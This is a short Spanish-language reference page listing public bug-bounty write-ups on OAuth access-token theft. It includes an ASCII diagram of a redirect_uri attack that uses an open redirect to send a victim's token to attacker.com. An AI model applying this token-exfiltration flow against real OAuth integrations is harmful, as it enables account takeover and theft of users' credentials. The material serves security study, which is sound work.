# OAuth 2.0 & Access Token Stealing Write-ups

## 1. Casos Emblemáticos de Bug Bounty

- **Facebook Access Token Stolen (Double Submit)**: *Jack Whitton* - Fuga de tokens de autenticación de Facebook a través de la manipulación de redirecciones secundarias y omisión de validaciones de dominio.
- **Bypassing Google Auth on Periscope Admin Panel**: *Jack Whitton* - Omisión completa de la verificación de dominio de correo institucional de Google OAuth para acceder al panel de administración global de Periscope.
- **GitHub Redirect URI Bypass via Directory Traversal**: *Egor Homakov* - Omisión de la validación del URI de retorno utilizando secuencias `/../` en la URL de GitHub OAuth.
- **Hacking Slack via postMessage & WebSockets**: *Detectify* - Intercepción de tokens de comunicación en tiempo real de Slack escuchando eventos de `postMessage` mal configurados en el navegador.
- **Stealing Facebook Messenger Nonce ($15,000 Bounty)**: *Stephen Sclafani* - Extracción del token/nonce de sesión en messenger.com mediante manipulación del flujo OAuth.

## 2. Diagrama de Flujo del Ataque a OAuth redirect_uri

```
[Usuario Víctima] ---> (Visita enlace malicioso) ---> [Servidor Attacker]
                                                              |
                                      Redirección con payload |
                                                              v
[Proveedor OAuth (Google/FB)] <--- GET /authorize?redirect_uri=https://client.com/redirect?url=https://attacker.com
               |
               | Redirecciona con Token/Code al Open Redirect
               v
[Servidor Atacante] <--- Recibe GET /log?access_token=eyJ... (TOKEN ROBADO!)
```
